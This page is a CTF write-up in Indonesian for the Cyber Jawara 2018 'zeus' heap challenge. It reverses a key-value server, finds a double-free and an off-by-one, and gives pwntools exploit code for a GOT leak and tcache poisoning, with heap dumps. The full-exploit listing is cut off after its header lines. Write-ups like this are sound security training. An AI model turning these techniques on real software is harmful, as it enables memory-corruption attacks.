<!doctype html>

<html lang="en-us">

<head>
  <title>Catousify</title>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <meta name="description" content="The HTML5 Herald" />
  <meta name="author" content="kiror0" /><meta name="generator" content="Hugo 0.62.0" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/8.0.0/normalize.min.css" />
  <script src="https://kit.fontawesome.com/b76b73e8e8.js" crossorigin="anonymous"></script>
  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto+Slab|Ruda" />
  <link rel="stylesheet" type="text/css" href="https://kiror0.github.io/ctf/css/styles.css" /></head>

<body>
  <div id="container">
    <header>
      <h1>
                <a href="https://kiror0.github.io/ctf/">Catousify</a>
            </h1>

      <ul id="social-media">
        
        
          
        <li><a href="https://github.com/kiror0"><i class="fab fa-github fa-lg" aria-hidden="true"></i></a></li>
           
      </ul>
      
      <p><em>No Clever Tagline Needed.</em></p>
      
    </header>

    
<nav>
    <ul>
        
        <li>
            <a class="" href="https://kiror0.github.io/ctf/posts/">
                <i class="fa-li fa  fa-lg"></i><span>Posts</span>
            </a>
        </li>
        
        <li>
            <a class="" href="https://kiror0.github.io/ctf/about/">
                <i class="fa-li fa  fa-lg"></i><span>About Me</span>
            </a>
        </li>
        
    </ul>
</nav>

    <main>




<article>

    <h1>Cyber Jawara 2018 Final - zeus</h1>

    
        <aside>
    <ul>
        <li>
            <time class="post-date" datetime="2018-10-14T18:55:10Z">Oct 14, 2018</time>
        </li>
        
        <li>
            Categories:
            <em>
                
                    
                    <a href="https://kiror0.github.io/ctf/categories/writeup">writeup</a>
                
                    , 
                    <a href="https://kiror0.github.io/ctf/categories/pwn">pwn</a>
                
            </em>
        </li>
        

        

        <li>8 minutes read</li>
    </ul>
</aside>

    

    <h2 id="desc">desc</h2>
<blockquote>
<p>In-memory key-value database server like Redis and Memcache is widely used for caching in a production server. Can you pwn this key-value database service? You need to reverse engineered it first to know what data structure is used for storing the data. This service is also run with sandbox. For patching, you are only allowed to patch 32 bytes in &lsquo;zeus&rsquo; binary and only 2 bytes in &lsquo;zeus_sandbox&rsquo;. For this service, all attack points are multiplied by 2x.</p>
</blockquote>
<blockquote>
<p>Downloads :
<a href="https://kiror0.github.io/ctf/assets/cj/zeus/zeus">zeus</a>
<a href="https://kiror0.github.io/ctf/assets/cj/zeus/libc-2.28-9dc614ec33ee0284064ec5535bda431c.so">libc-2.28-9dc614ec33ee0284064ec5535bda431c.so</a>
<a href="https://kiror0.github.io/ctf/assets/cj/zeus/solve.py">solve.py</a></p>
</blockquote>
<pre><code>λ › ./zeus
...

(1) Insert
(2) Delete
(3) Lookup
(0) Exit

&gt;&gt; 1
Key length: 8
Insert key: AAAAAAAA
Value length: 8
Insert value: AAAAAAAA
8
[Key inserted] AAAAAAAA:AAAAAAAA

(1) Insert
(2) Delete
(3) Lookup
(0) Exit

&gt;&gt; 3
Key: AAAAAAAA
Value: AAAAAAAA^C

[*] '/Challs/cj/p11-zeus/zeus'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

[*] '/Challs/cj/p11-zeus/libc-2.28-9dc614ec33ee0284064ec5535bda431c.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
</code></pre><h2 id="intro">intro</h2>
<p>Problem heap dengan interface menu yang tidak terlalu asing (add-delete-view). libc yang dipakai adalah libc 2.28 dari ubuntu 18.10, dengan begitu fitur tcache ada di libc ini. Bisa diperiksa lagi juga,</p>
<pre><code>λ › grep tcache libc-2.28-9dc614ec33ee0284064ec5535bda431c.so
Binary file libc-2.28-9dc614ec33ee0284064ec5535bda431c.so matches
</code></pre><p>tcache itu apa sih? tcache ini secara singkat bisa dibaca di sini <a href="http://tukan.farm/2017/07/08/tcache/">http://tukan.farm/2017/07/08/tcache/</a>, untuk yang belum paham glibc malloc dan internalnya, baca dulu <a href="https://github.com/shellpish/how2heap">https://github.com/shellpish/how2heap</a></p>
<h2 id="internals">internals</h2>
<p>Beberapa hal internal penting yang dipakai pada binary ini,</p>
<h3 id="safe-malloc-">safe-malloc (?)</h3>
<p><em>request</em> size terbatas 0 - 0x400.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C">uint_16t size;

<span style="color:#66d9ef">if</span> ( size <span style="color:#f92672">&amp;</span><span style="color:#f92672">&amp;</span> size <span style="color:#f92672">&lt;</span><span style="color:#f92672">=</span> <span style="color:#ae81ff">0x400u</span> )
  {
    ptr <span style="color:#f92672">=</span> malloc(size);
    memset(ptr, <span style="color:#ae81ff">0</span>, size);
    _ptr <span style="color:#f92672">=</span> ptr;
  }
</code></pre></div><h3 id="single-linked-list-data">single linked-list data</h3>
<p>data disimpan dengan model linked list</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"><span style="color:#66d9ef">struct</span> _list
{
  uint_16t key_len;
  uint_16t value_len;
  <span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> key;
  <span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> value;
  _list<span style="color:#f92672">*</span> next;
};
</code></pre></div><h2 id="bug">bug</h2>
<h3 id="double-free">double-free</h3>
<p>Pada <code>delete()</code>, jika list terakhir dihapus, pointer next terkahir (NULL) tidak diarahkan ke list sebelumnya, skema double-free dapat dilakukan hanya pada list terakhir.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C">found <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
<span style="color:#66d9ef">while</span> ( ptr<span style="color:#f92672">-</span><span style="color:#f92672">&gt;</span>next )
  {
    tmp <span style="color:#f92672">=</span> ptr;
    ptr <span style="color:#f92672">=</span> (linked_list <span style="color:#f92672">*</span>)ptr<span style="color:#f92672">-</span><span style="color:#f92672">&gt;</span>next;
    <span style="color:#66d9ef">if</span> ( ptr<span style="color:#f92672">-</span><span style="color:#f92672">&gt;</span>key <span style="color:#f92672">&amp;</span><span style="color:#f92672">&amp;</span> <span style="color:#f92672">!</span>strcmp(ptr<span style="color:#f92672">-</span><span style="color:#f92672">&gt;</span>key, s) )
      {
        found <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
        <span style="color:#66d9ef">if</span> ( ptr<span style="color:#f92672">-</span><span style="color:#f92672">&gt;</span>next )
          tmp<span style="color:#f92672">-</span><span style="color:#f92672">&gt;</span>next <span style="color:#f92672">=</span> ptr<span style="color:#f92672">-</span><span style="color:#f92672">&gt;</span>next; <span style="color:#75715e">// BUG
</span><span style="color:#75715e"></span>        free(ptr);
        <span style="color:#66d9ef">break</span>;
      }
  }
</code></pre></div><h3 id="off-by-one-null-byte">off-by-one null byte</h3>
<p><code>insert()</code> pada saat memasukkan nilai null-byte ke string.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C">  printf(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Key length: </span><span style="color:#e6db74">&#34;</span>);
  fgets(<span style="color:#f92672">&amp;</span>s, <span style="color:#ae81ff">1024</span>, stdin);
  _key_len <span style="color:#f92672">=</span> atoi(<span style="color:#f92672">&amp;</span>s);
  _key <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)safe_malloc(_key_len);
  <span style="color:#66d9ef">if</span> ( _key )
  {
    printf(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Insert key: </span><span style="color:#e6db74">&#34;</span>, <span style="color:#ae81ff">1024LL</span>);
    fgets(_key, _key_len <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span>, stdin);
    _key[_key_len] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#75715e">// BUG
</span><span style="color:#75715e"></span>    printf(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Value length: </span><span style="color:#e6db74">&#34;</span>);
    fgets(<span style="color:#f92672">&amp;</span>s, <span style="color:#ae81ff">1024</span>, stdin);
    _value_len <span style="color:#f92672">=</span> atoi(<span style="color:#f92672">&amp;</span>s);
    _value <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)safe_malloc(_value_len);
    <span style="color:#66d9ef">if</span> ( _value )
    {
      printf(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Insert value: </span><span style="color:#e6db74">&#34;</span>, <span style="color:#ae81ff">1024LL</span>);
      fgets(_value, _value_len <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span>, stdin);
      _value[_value_len] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#75715e">// BUG
</span><span style="color:#75715e"></span>      v0 <span style="color:#f92672">=</span> strlen(_value);
      printf(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">%d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, v0);
      found <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
      list <span style="color:#f92672">=</span> (linked_list <span style="color:#f92672">*</span>)p_list;
      <span style="color:#66d9ef">while</span> ( list<span style="color:#f92672">-</span><span style="color:#f92672">&gt;</span>next )
      {
        list <span style="color:#f92672">=</span> (linked_list <span style="color:#f92672">*</span>)list<span style="color:#f92672">-</span><span style="color:#f92672">&gt;</span>next;
        <span style="color:#66d9ef">if</span> ( list<span style="color:#f92672">-</span><span style="color:#f92672">&gt;</span>key <span style="color:#f92672">&amp;</span><span style="color:#f92672">&amp;</span> <span style="color:#f92672">!</span>strcmp(list<span style="color:#f92672">-</span><span style="color:#f92672">&gt;</span>key, _key) )
        {
          found <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
          <span style="color:#66d9ef">if</span> ( list<span style="color:#f92672">-</span><span style="color:#f92672">&gt;</span>value_len <span style="color:#f92672">&lt;</span> _value_len )
          {
            list<span style="color:#f92672">-</span><span style="color:#f92672">&gt;</span>value <span style="color:#f92672">=</span> realloc(list<span style="color:#f92672">-</span><span style="color:#f92672">&gt;</span>value, _value_len <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>);
            list<span style="color:#f92672">-</span><span style="color:#f92672">&gt;</span>value_len <span style="color:#f92672">=</span> _value_len;
          }
          memcpy(list<span style="color:#f92672">-</span><span style="color:#f92672">&gt;</span>value, _value, _value_len);
          printf(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">[Key modified] %s:%s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, list<span style="color:#f92672">-</span><span style="color:#f92672">&gt;</span>key, list<span style="color:#f92672">-</span><span style="color:#f92672">&gt;</span>value);
          <span style="color:#66d9ef">break</span>;
        }
      }
      <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span>found )
      {
        tmp <span style="color:#f92672">=</span> (linked_list <span style="color:#f92672">*</span>)malloc(<span style="color:#ae81ff">0x20uLL</span>);
        tmp<span style="color:#f92672">-</span><span style="color:#f92672">&gt;</span>key_len <span style="color:#f92672">=</span> _key_len;
        tmp<span style="color:#f92672">-</span><span style="color:#f92672">&gt;</span>value_len <span style="color:#f92672">=</span> _value_len;
        tmp<span style="color:#f92672">-</span><span style="color:#f92672">&gt;</span>key <span style="color:#f92672">=</span> _key;
        tmp<span style="color:#f92672">-</span><span style="color:#f92672">&gt;</span>value <span style="color:#f92672">=</span> _value;
        tmp<span style="color:#f92672">-</span><span style="color:#f92672">&gt;</span>next <span style="color:#f92672">=</span> <span style="color:#ae81ff">0LL</span>;
        list<span style="color:#f92672">-</span><span style="color:#f92672">&gt;</span>next <span style="color:#f92672">=</span> tmp;
        printf(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">[Key inserted] %s:%s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, _key, _value);
      }
    }
</code></pre></div><p>off-by-one ini sebenernya gak terlalu berguna (??) karena jika mau diakitkan dengan exploit malloc dengan poison-null-byte, pointer untuk <code>free()</code> hanya pada linked list yang ukurannya tetap di 0x20, sedangkan poison-null-byte lebih mudah jika ukuran malloc 0x100++.</p>
<h2 id="exploit">exploit</h2>
<p>buat mempermudah penulisan exploit,</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">insert</span>(key, val):
    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">&gt;&gt; </span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">1</span><span style="color:#e6db74">&#39;</span>)
    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">: </span><span style="color:#e6db74">&#39;</span>, len(key)<span style="color:#f92672">.</span>__str__())
    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">: </span><span style="color:#e6db74">&#39;</span>, key)
    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">: </span><span style="color:#e6db74">&#39;</span>, len(val)<span style="color:#f92672">.</span>__str__())
    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">: </span><span style="color:#e6db74">&#39;</span>, val)
    r<span style="color:#f92672">.</span>recvline(False)
    log<span style="color:#f92672">.</span>info(r<span style="color:#f92672">.</span>recvline(False))

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">delete</span>(key):
    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">&gt;&gt; </span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">2</span><span style="color:#e6db74">&#39;</span>)
    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">: </span><span style="color:#e6db74">&#39;</span>, key)
    log<span style="color:#f92672">.</span>info(r<span style="color:#f92672">.</span>recvline(False))

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">lookup</span>(key):
    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">&gt;&gt; </span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">3</span><span style="color:#e6db74">&#39;</span>)
    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">: </span><span style="color:#e6db74">&#39;</span>, key)
    r<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">: </span><span style="color:#e6db74">&#39;</span>)
    <span style="color:#66d9ef">return</span> r<span style="color:#f92672">.</span>recvline(False)
</code></pre></div><h3 id="leak">leak</h3>
<p>libc leak dapat memanfaatkan double-free. <code>free()</code> hanya dilakukan ke struct list ukurannya 0x20 yang berarti masuk ke <code>fastbin[1] (0x30)</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">insert(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">A</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">a</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span>)

<span style="color:#75715e"># fastbin[0] (0x20) : AAAAAAAA -&gt; aaaaaaaa</span>
<span style="color:#75715e"># fastbin[1] (0x30) : A</span>
<span style="color:#75715e"># tcache_entry[1] (0x30 freelist) :</span>
<span style="color:#75715e"># list : A</span>

insert(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">B</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span>)

<span style="color:#75715e"># fastbin[0] (0x20) : AAAAAAAA -&gt; aaaaaaaa -&gt; BBBBBBBB -&gt; bbbbbbbb</span>
<span style="color:#75715e"># fastbin[1] (0x30) : A -&gt; B</span>
<span style="color:#75715e"># tcache_entry[1] (0x30 freelist) :</span>
<span style="color:#75715e"># list : A -&gt; B</span>

delete(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">B</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span>)

<span style="color:#75715e"># tcache_entry[1] (0x30 freelist) : B</span>
<span style="color:#75715e"># list : A -&gt; B</span>

delete(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">A</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span>)

<span style="color:#75715e"># tcache_entry[1] (0x30 freelist) : B -&gt; A</span>
<span style="color:#75715e"># list : B</span>

delete(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">B</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span>)

<span style="color:#75715e"># tcache_entry[1] (0x30 freelist) : B -&gt; A -&gt; B</span>
<span style="color:#75715e"># list : B</span>

<span style="color:#75715e"># gdb-peda$ heapinfo</span>
<span style="color:#75715e"># (0x20)     fastbin[0]: 0x0</span>
<span style="color:#75715e"># (0x30)     fastbin[1]: 0x0</span>
<span style="color:#75715e"># (0x40)     fastbin[2]: 0x0</span>
<span style="color:#75715e"># (0x50)     fastbin[3]: 0x0</span>
<span style="color:#75715e"># (0x60)     fastbin[4]: 0x0</span>
<span style="color:#75715e"># (0x70)     fastbin[5]: 0x0</span>
<span style="color:#75715e"># (0x80)     fastbin[6]: 0x0</span>
<span style="color:#75715e"># (0x90)     fastbin[7]: 0x0</span>
<span style="color:#75715e"># (0xa0)     fastbin[8]: 0x0</span>
<span style="color:#75715e"># (0xb0)     fastbin[9]: 0x0</span>
<span style="color:#75715e">#                   top: 0xbb8370 (size : 0x1fc90) </span>
<span style="color:#75715e">#        last_remainder: 0x0 (size : 0x0) </span>
<span style="color:#75715e">#             unsortbin: 0x0</span>
<span style="color:#75715e"># (0x30)   tcache_entry[1]: 0xbb8350 --&gt; 0xbb82e0 --&gt; 0xbb8350 (overlap chunk with 0xbb8340(freed) ) !!!</span>
</code></pre></div><p>Seeb, udah punya 2 pointer yang sama di freelist. Lanjut, karena setiap <em>request</em> list data baru selalu melakukan malloc(0x20), biar mencegah linked list jadi infinite loop, buat value/key ukurannya jatuh di fastbin[1] (0x30) yang berarti sekitar [0x19 - 0x28]. Dari sini bisa dimanfaatkan untuk membuat fake list yang meng <em>overwrite</em> list B.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># fake list di B</span>
fake_list  <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0</span>) <span style="color:#75715e"># fd</span>
fake_list <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x00400505</span>) <span style="color:#75715e"># key : str.malloc</span>
fake_list <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x602020</span>) <span style="color:#75715e"># value : reloc.puts</span>
fake_list <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0</span>) <span style="color:#75715e"># next</span>

insert(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">A</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span>, fake_list)

<span style="color:#75715e"># tcache_entry[1] (0x30 freelist) : B</span>
<span style="color:#75715e"># list : malloc -&gt; B</span>

puts <span style="color:#f92672">=</span> u64(lookup(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">malloc</span><span style="color:#e6db74">&#39;</span>)<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>))
</code></pre></div><p>Loh, kok freelist jadi tinggal B? Sebelum <code>insert()</code> untuk key <code>'B' * 8</code>, <code>malloc()</code> untuk value lebih dulu dilakukan jadi list untuk <code>'B' * 8</code> ter- <em>overwrite</em> oleh fake list. Intinya <code>'B' * 8</code> terhapus sehingga <code>malloc(0x20)</code> tetap dilakukan untuk key <code>'B' * 8</code> (ada dua kali <code>malloc(0x20)</code>). Untuk leak hanya perlu lookup value dari <code>malloc</code> karena sudah dibuat fake list dengan key <code>malloc</code> dan value ptr ke <code>reloc.puts</code> (got puts).</p>
<h3 id="tcache-poisoning">tcache poisoning</h3>
<p>tcache poisoning pada dasarnya hanya mengubah tcache_entry pada malloc`d yang telah di free ke value yang diinginkan. Kondisi heap pada saat sebelum setelah di <code>free()</code>,</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">delete(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">B</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span>)

<span style="color:#75715e"># (0x30)   tcache_entry[1]: 0x1bab350</span>
<span style="color:#75715e"># 0x1bab290:      0x0000000000000000      0x0000000000000021</span>
<span style="color:#75715e"># 0x1bab2a0:      0x4141414141414141      0x0000000000000000</span>
<span style="color:#75715e"># 0x1bab2b0:      0x0000000000000000      0x0000000000000021</span>
<span style="color:#75715e"># 0x1bab2c0:      0x6161616161616161      0x0000000000000000</span>
<span style="color:#75715e"># 0x1bab2d0:      0x0000000000000000      0x0000000000000031</span>
<span style="color:#75715e"># 0x1bab2e0:      0x0000000800000008      0x0000000001bab2a0</span>
<span style="color:#75715e"># 0x1bab2f0:      0x0000000001bab2c0      0x0000000001bab350</span>
<span style="color:#75715e"># 0x1bab300:      0x0000000000000000      0x0000000000000021</span>
<span style="color:#75715e"># 0x1bab310:      0x4242424242424242      0x0000000000000000</span>
<span style="color:#75715e"># 0x1bab320:      0x0000000000000000      0x0000000000000021</span>
<span style="color:#75715e"># 0x1bab330:      0x6262626262626262      0x0000000000000000</span>
<span style="color:#75715e"># 0x1bab340:      0x0000000000000000      0x0000000000000031</span>
<span style="color:#75715e"># 0x1bab350:      0x0000000000000000      0x0000000001bab310</span>
<span style="color:#75715e"># 0x1bab360:      0x0000000001bab330      0x0000000000000000</span>
<span style="color:#75715e"># 0x1bab370:      0x0000000000000000      0x000000000001fc91</span>

delete(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">A</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span>)

<span style="color:#75715e"># (0x30)   tcache_entry[1]: 0x1bab2e0 --&gt; 0x1bab350</span>
<span style="color:#75715e"># 0x1bab290:      0x0000000000000000      0x0000000000000021</span>
<span style="color:#75715e"># 0x1bab2a0:      0x4141414141414141      0x0000000000000000</span>
<span style="color:#75715e"># 0x1bab2b0:      0x0000000000000000      0x0000000000000021</span>
<span style="color:#75715e"># 0x1bab2c0:      0x6161616161616161      0x0000000000000000</span>
<span style="color:#75715e"># 0x1bab2d0:      0x0000000000000000      0x0000000000000031</span>
<span style="color:#75715e"># 0x1bab2e0:      0x0000000001bab350      0x0000000001bab2a0 </span>
<span style="color:#75715e">#                      ^----------------- tcache_entry</span>
<span style="color:#75715e"># 0x1bab2f0:      0x0000000001bab2c0      0x0000000001bab350</span>
<span style="color:#75715e"># 0x1bab300:      0x0000000000000000      0x0000000000000021</span>
<span style="color:#75715e"># 0x1bab310:      0x4242424242424242      0x0000000000000000</span>
<span style="color:#75715e"># 0x1bab320:      0x0000000000000000      0x0000000000000021</span>
<span style="color:#75715e"># 0x1bab330:      0x6262626262626262      0x0000000000000000</span>
<span style="color:#75715e"># 0x1bab340:      0x0000000000000000      0x0000000000000031</span>
<span style="color:#75715e"># 0x1bab350:      0x0000000000000000      0x0000000001bab310</span>
<span style="color:#75715e"># 0x1bab360:      0x0000000001bab330      0x0000000000000000</span>
<span style="color:#75715e"># 0x1bab370:      0x0000000000000000      0x000000000001fc91</span>

delete(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">B</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span>)
<span style="color:#75715e"># (0x30)   tcache_entry[1]: 0x1bab350 --&gt; 0x1bab2e0 --&gt; 0x1bab350 (overlap chunk with 0x1bab340(freed) ) !!!</span>
<span style="color:#75715e"># 0x1bab290:      0x0000000000000000      0x0000000000000021</span>
<span style="color:#75715e"># 0x1bab2a0:      0x4141414141414141      0x0000000000000000</span>
<span style="color:#75715e"># 0x1bab2b0:      0x0000000000000000      0x0000000000000021</span>
<span style="color:#75715e"># 0x1bab2c0:      0x6161616161616161      0x0000000000000000</span>
<span style="color:#75715e"># 0x1bab2d0:      0x0000000000000000      0x0000000000000031</span>
<span style="color:#75715e"># 0x1bab2e0:      0x0000000001bab350      0x0000000001bab2a0</span>
<span style="color:#75715e">#                      ^----------------- tcache_entry</span>
<span style="color:#75715e"># 0x1bab2f0:      0x0000000001bab2c0      0x0000000001bab350</span>
<span style="color:#75715e"># 0x1bab300:      0x0000000000000000      0x0000000000000021</span>
<span style="color:#75715e"># 0x1bab310:      0x4242424242424242      0x0000000000000000</span>
<span style="color:#75715e"># 0x1bab320:      0x0000000000000000      0x0000000000000021</span>
<span style="color:#75715e"># 0x1bab330:      0x6262626262626262      0x0000000000000000</span>
<span style="color:#75715e"># 0x1bab340:      0x0000000000000000      0x0000000000000031</span>
<span style="color:#75715e"># 0x1bab350:      0x0000000001bab2e0      0x0000000001bab310</span>
<span style="color:#75715e">#                      ^----------------- tcache_entry</span>
<span style="color:#75715e"># 0x1bab360:      0x0000000001bab330      0x0000000000000000</span>
<span style="color:#75715e"># 0x1bab370:      0x0000000000000000      0x000000000001fc91</span>
</code></pre></div><p>Dengan begitu payload sebelumnya untuk leak hanya perlu diubah sedikit untuk mengotrol tcache_entry ke got,</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">fake_list <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x602078</span>) <span style="color:#75715e"># tcache_entries -&gt; got</span>
fake_list <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x00400505</span>) <span style="color:#75715e"># key : str.malloc</span>
fake_list <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x602020</span>) <span style="color:#75715e"># value : reloc.puts</span>
fake_list <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0</span>) <span style="color:#75715e"># next</span>

insert(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">A</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span>, fake_list)
</code></pre></div><p>tepat setelah beberapa kali malloc di fastbin[1], malloc akan return pointer di got.</p>
<h2 id="full-exploit">full-exploit</h2>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python</span>
<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
<span style="color:#f92672">import</span> sys<span style="color:#f92672">,</span> os

gdbcmd <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">b *0x004011ca</span><span style="color:#e6db74">&#39;</span>

context<span style="color:#f92672">.</span>terminal <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">kitty @ new-window --new-tab --tab-title pwn --keep-focus sh -c</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>split()
<span style="color:#75715e"># context.log_level = &#39;warn&#39;</span>


